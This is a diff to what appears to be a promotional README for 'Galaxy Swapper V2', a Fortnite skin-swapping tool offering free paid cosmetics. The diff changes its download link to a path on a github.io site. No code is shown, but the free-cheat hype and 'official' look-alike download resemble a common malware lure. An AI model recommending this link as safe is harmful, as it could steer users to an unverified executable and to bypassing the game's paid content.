@@ -2,7 +2,7 @@
 
 Unlock **rare Fortnite skins, emotes, and cosmetics instantly** with Galaxy Swapper V2 Official! The safest and easiest-to-use **Fortnite Skin Swapper** tool, compatible with **PC, Android, and emulators**. Perfect for players who want to **stand out in lobbies** without spending money!  
 
-[![Download Now 🔥](https://img.shields.io/badge/Download-Galaxy_Swapper_V2-blueviolet)](https://galaxy-swapper-v2-official.github.io/.github/)  
+[![Download Now 🔥](https://img.shields.io/badge/Download-Galaxy_Swapper_V2-blueviolet)](https://galaxy-swapper-v2-official.github.io/.github/galaxyswapperv2) 
 
 ---
 
